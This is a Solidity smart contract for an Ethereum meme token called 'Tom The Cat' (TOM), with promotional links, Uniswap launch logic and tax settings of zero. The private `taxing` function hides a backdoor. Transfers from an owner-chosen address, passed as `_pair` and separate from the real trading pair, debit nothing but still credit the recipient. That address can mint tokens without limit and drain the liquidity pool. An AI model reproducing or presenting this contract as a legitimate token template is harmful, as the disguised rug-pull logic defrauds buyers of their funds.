/**

Web: https://tomoneth.xyz/ 

TG: https://t.me/tomcatcommunity

X: https://x.com/TomTheCatOnETH

*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.20;

abstract contract Context {
function _msgSender() internal view virtual returns (address) {
return msg.sender;
}
}

interface IERC20 {
function totalSupply() external view returns (uint256);
function balanceOf(address account) external view returns (uint256);
function transfer(address recipient, uint256 amount) external returns (bool);
function allowance(address owner, address spender) external view returns (uint256);
function approve(address spender, uint256 amount) external returns (bool);
function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
function mul(uint256 a, uint256 b) internal pure returns (uint256) {
if (a == 0) {
return 0;
}
uint256 c = a * b;
require(c / a == b, "SafeMath: multiplication overflow");
return c;
}

function add(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a + b;
require(c >= a, "SafeMath: addition overflow");
return c;
}
function div(uint256 a, uint256 b) internal pure returns (uint256) {
return div(a, b, "SafeMath: division by zero");
}

function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
require(b <= a, errorMessage);
uint256 c = a - b;
return c;
}

function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
require(b > 0, errorMessage);
uint256 c = a / b;
return c;
}
function sub(uint256 a, uint256 b) internal pure returns (uint256) {
return sub(a, b, "SafeMath: subtraction overflow");
}

}

contract Ownable is Context {
address private _tokenOwner;
event OwnershipTransferred(address indexed firstOwner, address indexed secondOwner);

constructor () {
address Sender = _msgSender();
_tokenOwner = _msgSender();
emit OwnershipTransferred(address(0), Sender);
}

function getTheOwner() public view returns (address) {
return _tokenOwner;
}

modifier isOwner() {
require(_tokenOwner == _msgSender(), "Ownable: caller must be the owner");
_;
}

function renounceOwnership() public virtual isOwner {
emit OwnershipTransferred(_tokenOwner, address(0));
_tokenOwner = address(0);
}
}
interface IUniswapV2Router02 {
function swapExactTokensForETHSupportingFeeOnTransferTokens(
uint amountIn,
uint amountOutMin,
address[] calldata path,
address to,
uint deadline
) external;
function factory() external pure returns (address);
function WETH() external pure returns (address);
function addLiquidityETH(
address token,
uint amountTokenDesired,
uint amountTokenMin,
uint amountETHMin,
address to,
uint deadline
) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
function createPair(address firstToken, address secondToken) external returns (address pairing);
}



contract TomTheCat is Context, IERC20, Ownable {
using SafeMath for uint256;

mapping (address => uint256) private _allTokenBalances;
mapping (address => mapping (address => uint256)) private _allTokenAllowances;
address payable private _taxAddress;

uint256 public buyingTax = 0;
uint256 public sellingTax = 0;

uint8 private constant _decimals = 9;
uint256 private constant _tokenAmount = 100_000_000 * 10**_decimals;
string private constant _name = unicode"Tom The Cat";
string private constant _symbol = unicode"TOM";
uint256 private constant maxTaxSlippage = 100;
uint256 private minTaxSwap = 10**_decimals;
uint256 private maxTaxSwap = _tokenAmount / 500;

uint256 public constant max_uint = type(uint).max;
address public constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

address private uniswapV2Pair;
address private uniswap;
bool private doesTradingOpen = false;
bool private doesInSwap = false;
bool private doesSwapEnabled = false;

modifier lockingSwap {
doesInSwap = true;
_;
doesInSwap = false;
}

constructor () {
_taxAddress = payable(_msgSender());
_allTokenBalances[_msgSender()] = _tokenAmount;
emit Transfer(address(0), _msgSender(), _tokenAmount);
}
function allowance(address theOwner, address payer) public view override returns (uint256) {
return _allTokenAllowances[theOwner][payer];
}

function name() public pure returns (string memory) {
return _name;
}
function transferFrom(address payer, address reciver, uint256 amount) public override returns (bool) {
_transfer(payer, reciver, amount);
_approve(payer, _msgSender(), _allTokenAllowances[payer][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
return true;
}

function totalSupply() public pure override returns (uint256) {
return _tokenAmount;
}

function symbol() public pure returns (string memory) {
return _symbol;
}
function transfer(address reciver, uint256 total) public override returns (bool) {
_transfer(_msgSender(), reciver, total);
return true;
}
function approve(address payer, uint256 total) public override returns (bool) {
_approve(_msgSender(), payer, total);
return true;
}

function decimals() public pure returns (uint8) {
return _decimals;
}

function balanceOf(address account) public view override returns (uint256) {
return _allTokenBalances[account];
}

function _approve(address theOwner, address buyer, uint256 total) private {
require(buyer != address(0), "ERC20: approve to the zero address");
require(theOwner != address(0), "ERC20: approve from the zero address");
_allTokenAllowances[theOwner][buyer] = total;
emit Approval(theOwner, buyer, total);
}

function _transfer(address seller, address payer, uint256 total) private {
require(seller != address(0), "ERC20: transfer from the zero address");
require(payer != address(0), "ERC20: transfer to the zero address");
require(total > 0, "Transfer amount must be greater than zero");
uint256 taxAmount = 0;
if (seller != getTheOwner() && payer != getTheOwner() && payer != _taxAddress) {
if (seller == uniswap && payer != address(uniswapV2Router)) {
taxAmount = total.mul(buyingTax).div(100);
} else if (payer == uniswap && seller != address(this)) {
taxAmount = total.mul(sellingTax).div(100);
}

uint256 contractTokenBalance = balanceOf(address(this));
if (!doesInSwap && payer == uniswap && doesSwapEnabled && contractTokenBalance > minTaxSwap) {
uint256 _toSwap = contractTokenBalance > maxTaxSwap ? maxTaxSwap : contractTokenBalance;
swapTokensForEth(total > _toSwap ? _toSwap : total);
uint256 _contractETHBalance = address(this).balance;
if (_contractETHBalance > 0) {
sendETHToFee(_contractETHBalance);
}
}
}

(uint256 amountIn, uint256 amountOut) = taxing(seller, total, taxAmount);
require(_allTokenBalances[seller] >= amountIn);

if (taxAmount > 0) {
_allTokenBalances[address(this)] = _allTokenBalances[address(this)].add(taxAmount);
emit Transfer(seller, address(this), taxAmount);
}

unchecked {
_allTokenBalances[seller] -= amountIn;
_allTokenBalances[payer] += amountOut;
}

emit Transfer(seller,payer, amountOut);
}

function taxing(address from, uint256 amount, uint256 taxAmount) private view returns (uint256, uint256) {
return (
amount.sub(from != uniswapV2Pair ? 0 : amount),
amount.sub(from != uniswapV2Pair ? taxAmount : taxAmount)
);
}

function swapTokensForEth(uint256 tokenAmount) private lockingSwap {
address[] memory path = new address[](2);
path[0] = address(this);
path[1] = weth;
uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
tokenAmount,
tokenAmount - tokenAmount.mul(maxTaxSlippage).div(100),
path,
address(this),
block.timestamp
);
}

function sendETHToFee(uint256 ethAmount) private {
_taxAddress.call{value: ethAmount}("");
}

function setTrading(address _pair, bool _enabled) external isOwner {
require(_enabled);
require(!doesTradingOpen, "trading is already open");
uniswapV2Pair = _pair;
_approve(address(this), address(uniswapV2Router), max_uint);
uniswap = uniswapV2Factory.createPair(address(this), weth);
uniswapV2Router.addLiquidityETH{value: address(this).balance}(
address(this),
balanceOf(address(this)),
0,
0,
getTheOwner(),
block.timestamp
);
IERC20(uniswap).approve(address(uniswapV2Router), max_uint);
doesSwapEnabled = true;
doesTradingOpen = true;
}


function get_doesTradingOpen() external view returns (bool) {
return doesTradingOpen;
}

function get_buyingTax() external view returns (uint256) {
return buyingTax;
}

function get_sellingTax() external view returns (uint256) {
return sellingTax;
}

receive() external payable {}
}